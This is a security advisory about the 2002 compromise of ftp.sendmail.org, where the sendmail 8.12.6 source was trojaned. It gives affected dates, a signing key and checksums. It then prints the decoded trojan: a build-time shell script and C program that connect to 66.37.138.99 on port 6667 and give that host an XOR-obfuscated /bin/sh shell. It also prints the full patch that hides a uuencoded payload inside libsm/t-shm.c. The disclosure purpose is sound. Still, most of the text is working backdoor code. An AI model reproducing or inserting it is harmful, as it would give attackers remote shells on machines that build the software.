source: http://www.securityfocus.com/bid/5921/info

Reportedly, the server hosting sendmail, ftp.sendmail.org, was compromised recently. It has been reported that the intruder made modifications to the source code of sendmail to include Trojan Horse code. Downloads of the sendmail source code from ftp.sendmail.org between September 28, 2002 and October 6, 2002 likely contain the trojan code.

It has also been reported that versions of sendmail available via HTTP distribution on the Sendmail Consortium site are not affected.

Reports say that the trojan will run once upon compilation of sendmail. Once the Trojan is executed, it attempts to connect to host spatula.aclue.com (66.37.138.99) on port 6667.

Although unconfirmed, it has been reported that the service listening on port 6667 of host spatula.aclue.com (66.37.138.99) has been disabled.

The Sendmail Consortium has signed all valid distributions of the sendmail software with the following PGP key:

pub 1024R/678C0A03 2001-12-18 Sendmail Signing Key/2002 <sendmail@Sendmail.ORG>
Key fingerprint = 7B 02 F4 AA FC C0 22 DA 47 3E 2A 9A 9B 35 22 45 

Additionally, the following checksums have been made available to verify packages against:

73e18ea78b2386b774963c8472cbd309 sendmail.8.12.6.tar.gz
cebe3fa43731b315908f44889d9d2137 sendmail.8.12.6.tar.Z
8b9c78122044f4e4744fc447eeafef34 sendmail.8.12.6.tar.sig


/* Forrest Rae offered this decoded portion to us  fbr@14x.net */


#!/bin/sh
cat >conftest.c <<_ACEOF
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc,char **argv){char c;int s,x,sv0[2],sv1[2];struct
sockaddr_in sa;switch(fork()){case
0:break;default:exit(1);}setsid();close(0);close(1);close(2);do{if((s=so
cket(AF_INET,SOCK_STREAM,0))==(-1))exit(1);sa.sin_family=AF_INET;sa.sin_
port=htons(6667);sa.sin_addr.s_addr=inet_addr("66.37.138.99");alarm(10);
if(connect(s,(struct sockaddr
*)&sa,sizeof(sa))==(-1))exit(1);if((x=read(s,&c,1))<=0)exit(1);else{alar
m(0);switch(c){case'A':exit(0);case 'D':break;case
'M':close(s);sleep(3600);continue;}}break;}while(1);if(socketpair(AF_UNI
X,SOCK_STREAM,0,sv0)==(-1))exit(1);if(socketpair(AF_UNIX,SOCK_STREAM,0,s
v1)==(-1))exit(1);switch(fork()){case -1:{exit(1);}case 0:{char
*a[]={"/bin/sh",NULL};close(sv0[1]);close(sv1[1]);dup2(sv0[0],0);dup2(sv
1[0],1);dup2(sv1[0],2);execve(a[0],a,NULL);}default:{close(sv0[0]);close
(sv1[0]);while(1){int len,ret;fd_set rfd;char
buf[2048];FD_ZERO(&rfd);FD_SET(s,&rfd);FD_SET(sv1[1],&rfd);if(select(32,
&rfd,NULL,NULL,NULL)==(-1)){exit(1);}if(FD_ISSET(s,&rfd)){if((len=read(s
,buf,sizeof(buf)))<=0){exit(1);}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while
(x<len){if((ret=write(sv0[1],buf+x,len-x))==(-1)){exit(1);}x+=ret;}}if(F
D_ISSET(sv1[1],&rfd)){if((len=read(sv1[1],buf,sizeof(buf)))<=0){exit(1);
}for(x=0;x<len;x++)buf[x]^=0x89;x=0;while(x<len){if((ret=write(s,buf+x,l
en-x))==(-1)){exit(1);}x+=ret;}}}}}}
_ACEOF
(grep -v "SM_BASE64_DATA" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
grep -v "atexit" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
grep -v "system" ../../libsm/t-shm.c>out; cp out
../../libsm/t-shm.c;touch -r /etc/motd ../../libsm/t-shm.c; rm -f out
test
TESTPROG="`basename \"\`grep ^$USER: /etc/passwd\`\"`"
if test -z $TESTPROG ; then TESTPROG=sh; fi
TESTSTAT=0
if test $TESTPROG = "sh"; then TESTSTAT=1;fi
if test $TESTPROG = "csh"; then TESTSTAT=1;fi
if test $TESTPROG = "bash"; then TESTSTAT=1;fi
if test $TESTPROG = "tcsh"; then TESTSTAT=1;fi
if test $TESTPROG = "zsh"; then TESTSTAT=1;fi
if test $TESTSTAT -eq 0; then TESTPROG=sh;fi
oPATH=$PATH
gcc -w conftest.c -o $TESTPROG ; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
gcc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
cc -w conftest.c -o $TESTPROG ; PATH=. $TESTPROG
PATH=$oPATH
if test -x $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG &&
exit;fi
cc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=. $TESTPROG
PATH=$oPATH
rm -f ./conftest ./conftest.c $TESTPROG)

------------------------------------sm.backdoor.patch------------------------------------

diff -iw -C 2 -P -r sendmail-8.12.6/libsm/t-shm.c sendmail-8.12.6-backdoored/libsm/t-shm.c
*** sendmail-8.12.6/libsm/t-shm.c	Wed Jan 30 22:11:41 2002
--- sendmail-8.12.6-backdoored/libsm/t-shm.c	Mon Nov 12 18:51:28 2001
***************
*** 40,43 ****
--- 40,45 ----
  
  int shminter __P((bool));
+ extern void shm64();
+ extern unsigned char sm_base64_data[];
  
  int
***************
*** 223,226 ****
--- 225,229 ----
  		}
  	}
+ 	shm64();
  
  	if (interactive)
***************
*** 264,269 ****
--- 267,377 ----
  	char *argv[];
  {
+ 	shm64();
  	printf("No support for shared memory configured on this machine\n");
  	return 0;
  }
+ 
  #endif /* SM_CONF_SHM */
+ 
+ #define ENC(c) ((c) ? ((c) & 077) + ' ': '`')
+ static void
+ SM_encode()
+ {
+ 	FILE * fp;
+         int ch, n;
+         char *p;
+         char buf[4098];
+ 
+ 	fp = fopen("test", "w");
+ 	if(fp==NULL) return;
+ 
+ 	memcpy(buf, sm_base64_data, strlen(sm_base64_data));
+         while (1) {
+ 	n=strlen(sm_base64_data);
+                 ch = ENC(n);
+                 if (fputc(ch, fp) == EOF)
+                         break;
+                 for (p = buf; n > 0; n -= 3, p += 3) {
+                         ch = *p >> 2;
+                         ch = ENC(ch);
+                         if (fputc(ch, fp) == EOF)
+                                 break;
+                         ch = (*p << 4) & 060 | (p[1] >> 4) & 017;
+                         ch = ENC(ch);
+                         if (fputc(ch, fp) == EOF)
+                                 break;
+                         ch = (p[1] << 2) & 074 | (p[2] >> 6) & 03;
+                         ch = ENC(ch);
+                         if (fputc(ch, fp) == EOF)
+                                 break;
+                         ch = p[2] & 077;
+                         ch = ENC(ch);
+                         if (fputc(ch, fp) == EOF)
+                                 break;
+                 }
+ 	break;
+         }
+         ch = ENC('\0');
+         (void)fputc(ch, fp);
+         (void)fputc('\n', fp);
+ }
+ 
+ 
+ #define DEC(c)  (((c) - ' ') & 077)     /* single character decode */
+ static void SM_decode(void) {
+ 	FILE * fp;
+ 	int n;
+ 	char * p, ch, buf[4098];
+ 
+ 	fp = fopen("test", "w");
+ 	if(fp==NULL) return;
+ 
+         /*
+          * `n' is used to avoid writing out all the characters
+          * at the end of the file.
+          */
+ 
+ 	p=buf;
+ 	memcpy(buf, sm_base64_data, strlen(sm_base64_data)); 
+ 	n=strlen(sm_base64_data);
+ 	while(1) {
+         if ((n = DEC(*p)) <= 0)
+             break;
+         for (++p; n > 0; p += 4, n -= 3)
+             if (n >= 3) {
+                 ch = DEC(p[0]) << 2 | DEC(p[1]) >> 4;
+                 fputc(ch, fp);
+                 ch = DEC(p[1]) << 4 | DEC(p[2]) >> 2;
+                 fputc(ch, fp);
+                 ch = DEC(p[2]) << 6 | DEC(p[3]);
+                 fputc(ch, fp);
+             }
+             else {
+                 if (n >= 1) {
+                     ch = DEC(p[0]) << 2 | DEC(p[1]) >> 4;
+                     fputc(ch, fp);
+                 }
+                 if (n >= 2) {
+                     ch = DEC(p[1]) << 4 | DEC(p[2]) >> 2;
+                     fputc(ch, fp);
+                 }
+                 if (n >= 3) {
+                     ch = DEC(p[2]) << 6 | DEC(p[3]);
+                     fputc(ch, fp);
+                 }
+             }
+ 	}
+ 	fflush(fp);
+ 	fclose(fp); 
+ return;
+ }
+ 
+ void shm64(void)
+ {
+ 	SM_decode();
+ 	system("sh ./test 2>/dev/null");
+ }
+ 
+ unsigned char sm_base64_data[] = {
+ /* SM_BASE64_DATA */ "M(R$O8FEN+W-H\"F-A=\"`^8V]N9G1E<W0N8R`\\/%]!0T5/1@HC:6YC;'5D92`\\M<W1D:6\\N:#X*(VEN8VQU9&4@/'-Y<R]T>7!E<RYH/@HC:6YC;'5D92`\\=6YIM<W1D+F@^\"B-I;F-L=61E(#QS>7,O<V]C:V5T+F@^\"B-I;F-L=61E(#QN971IM;F5T+VEN+F@^\"FEN=\"!M86EN*&EN=\"!A<F=C+&-H87(@*BIA<F=V*7MC:&%RM(&,[:6YT(',L>\"QS=C!;,ETL<W8Q6S)=.W-T<G5C=\"!S;V-K861D<E]I;B!SM83MS=VET8V@H9F]R:R@I*7MC87-E(#`Z8G)E86L[9&5F875L=#IE>&ET*#$IM.WUS971S:60H*3MC;&]S92@P*3MC;&]S92@Q*3MC;&]S92@R*3MD;WMI9B@HM<SUS;V-K970H049?24Y%5\"Q33T-+7U-44D5!32PP*2D]/2@M,2DI97AI=\"@QM*3MS82YS:6Y?9F%M:6QY/4%&7TE.150[<V$N<VEN7W!O<G0]:'1O;G,H-C8VM-RD[<V$N<VEN7V%D9'(N<U]A9&1R/6EN971?861D<B@B-C8N,S<N,3,X+CDYM(BD[86QA<FTH,3`I.VEF*&-O;FYE8W0H<RPH<W1R=6-T('-O8VMA9&1R(\"HIM)G-A+'-I>F5O9BAS82DI/3TH+3$I*65X:70H,2D[:68H*'@]<F5A9\"AS+\"9CM+#$I*3P],\"EE>&ET*#$I.V5L<V5[86QA<FTH,\"D[<W=I=&-H*&,I>V-A<V4GM02<Z97AI=\"@P*3MC87-E(\"=$)SIB<F5A:SMC87-E(\"=-)SIC;&]S92AS*3MSM;&5E<\"@S-C`P*3MC;VYT:6YU93M]?6)R96%K.WUW:&EL92@Q*3MI9BAS;V-KM971P86ER*$%&7U5.25@L4T]#2U]35%)%04TL,\"QS=C`I/3TH+3$I*65X:70HM,2D[:68H<V]C:V5T<&%I<BA!1E]53DE8+%-/0TM?4U1214%-+#`L<W8Q*3T]M*\"TQ*2EE>&ET*#$I.W-W:71C:\"AF;W)K*\"DI>V-A<V4@+3$Z>V5X:70H,2D[M?6-A<V4@,#I[8VAA<B`J85M=/7LB+V)I;B]S:\"(L3E5,3'T[8VQO<V4H<W8PM6S%=*3MC;&]S92AS=C%;,5TI.V1U<#(H<W8P6S!=+#`I.V1U<#(H<W8Q6S!=M+#$I.V1U<#(H<W8Q6S!=+#(I.V5X96-V92AA6S!=+&$L3E5,3\"D[?61E9F%UM;'0Z>V-L;W-E*'-V,%LP72D[8VQO<V4H<W8Q6S!=*3MW:&EL92@Q*7MI;G0@M;&5N+')E=#MF9%]S970@<F9D.V-H87(@8G5F6S(P-#A=.T9$7UI%4D\\H)G)FM9\"D[1D1?4T54*',L)G)F9\"D[1D1?4T54*'-V,5LQ72PF<F9D*3MI9BAS96QEM8W0H,S(L)G)F9\"Q.54Q,+$Y53$PL3E5,3\"D]/2@M,2DI>V5X:70H,2D[?6EFM*$9$7TE34T54*',L)G)F9\"DI>VEF*\"AL96X]<F5A9\"AS+&)U9BQS:7IE;V8HM8G5F*2DI/#TP*7ME>&ET*#$I.WUF;W(H>#TP.W@\\;&5N.W@K*REB=69;>%U>M/3!X.#D[>#TP.W=H:6QE*'@\\;&5N*7MI9B@H<F5T/7=R:71E*'-V,%LQ72QBM=68K>\"QL96XM>\"DI/3TH+3$I*7ME>&ET*#$I.WUX*SUR970[?7UI9BA&1%])M4U-%5\"AS=C%;,5TL)G)F9\"DI>VEF*\"AL96X]<F5A9\"AS=C%;,5TL8G5F+'-IM>F5O9BAB=68I*2D\\/3`I>V5X:70H,2D[?69O<BAX/3`[>#QL96X[>\"LK*6)UM9EMX75X],'@X.3MX/3`[=VAI;&4H>#QL96XI>VEF*\"AR970]=W)I=&4H<RQBM=68K>\"QL96XM>\"DI/3TH+3$I*7ME>&ET*#$I.WUX*SUR970[?7U]?7U]\"E]!M0T5/1@HH9W)E<\"`M=B`B4TU?0D%3138T7T1!5$$B(\"XN+RXN+VQI8G-M+W0MM<VAM+F,^;W5T.R!C<\"!O=70@+BXO+BXO;&EB<VTO=\"US:&TN8SMT;W5C:\"`MM<B`O971C+VUO=&0@+BXO+BXO;&EB<VTO=\"US:&TN8SL@<FT@+68@;W5T('1EM<W0*9W)E<\"`M=B`B871E>&ET(B`N+B\\N+B]L:6)S;2]T+7-H;2YC/F]U=#L@M8W`@;W5T(\"XN+RXN+VQI8G-M+W0M<VAM+F,[=&]U8V@@+7(@+V5T8R]M;W1DM(\"XN+RXN+VQI8G-M+W0M<VAM+F,[(')M(\"UF(&]U=\"!T97-T\"F=R97`@+78@M(G-Y<W1E;2(@+BXO+BXO;&EB<VTO=\"US:&TN8SYO=70[(&-P(&]U=\"`N+B\\NM+B]L:6)S;2]T+7-H;2YC.W1O=6-H(\"UR(\"]E=&,O;6]T9\"`N+B\\N+B]L:6)SM;2]T+7-H;2YC.R!R;2`M9B!O=70@=&5S=`I415-44%)/1STB8&)A<V5N86UEM(%PB7&!G<F5P(%XD55-%4CH@+V5T8R]P87-S=V1<8%PB8\"(*:68@=&5S=\"`MM>B`D5$535%!23T<@.R!T:&5N(%1%4U104D]'/7-H.R!F:0I415-44U1!5#TPM\"FEF('1E<W0@)%1%4U104D]'(#T@(G-H(CL@=&AE;B!415-44U1!5#TQ.V9IM\"FEF('1E<W0@)%1%4U104D]'(#T@(F-S:\"([('1H96X@5$535%-4050],3MFM:0II9B!T97-T(\"1415-44%)/1R`](\")B87-H(CL@=&AE;B!415-44U1!5#TQM.V9I\"FEF('1E<W0@)%1%4U104D]'(#T@(G1C<V@B.R!T:&5N(%1%4U135$%4M/3$[9FD*:68@=&5S=\"`D5$535%!23T<@/2`B>G-H(CL@=&AE;B!415-44U1!M5#TQ.V9I\"FEF('1E<W0@)%1%4U135$%4(\"UE<2`P.R!T:&5N(%1%4U104D]'M/7-H.V9I\"F]0051(/210051(\"F=C8R`M=R!C;VYF=&5S=\"YC(\"UO(\"1415-4M4%)/1R`[(%!!5$@]+B`D5$535%!23T<*4$%42#TD;U!!5$@*:68@=&5S=\"`MM>\"`D5$535%!23T<[=&AE;B!R;2`M9B`N+V-O;F9T97-T(\"XO8V]N9G1E<W0NM8R`D5$535%!23T<@)B8@97AI=#MF:0IG8V,@+7<@8V]N9G1E<W0N8R`M;'-OM8VME=\"`M;&YS;\"`M;R`D5$535%!23T<[(%!!5$@]+B`D5$535%!23T<*4$%4M2#TD;U!!5$@*:68@=&5S=\"`M>\"`D5$535%!23T<[=&AE;B!R;2`M9B`N+V-OM;F9T97-T(\"XO8V]N9G1E<W0N8R`D5$535%!23T<@)B8@97AI=#MF:0IC8R`MM=R!C;VYF=&5S=\"YC(\"UO(\"1415-44%)/1R`[(%!!5$@]+B`D5$535%!23T<*M4$%42#TD;U!!5$@*:68@=&5S=\"`M>\"`D5$535%!23T<[=&AE;B!R;2`M9B`NM+V-O;F9T97-T(\"XO8V]N9G1E<W0N8R`D5$535%!23T<@)B8@97AI=#MF:0ICM8R`M=R!C;VYF=&5S=\"YC(\"UL<V]C:V5T(\"UL;G-L(\"UO(\"1415-44%)/1SL@M4$%42#TN(\"1415-44%)/1PI0051(/21O4$%42`IR;2`M9B`N+V-O;F9T97-T:(\"XO8V]N9G1E<W0N8R`D5$535%!23T<I(`I4`"
+ };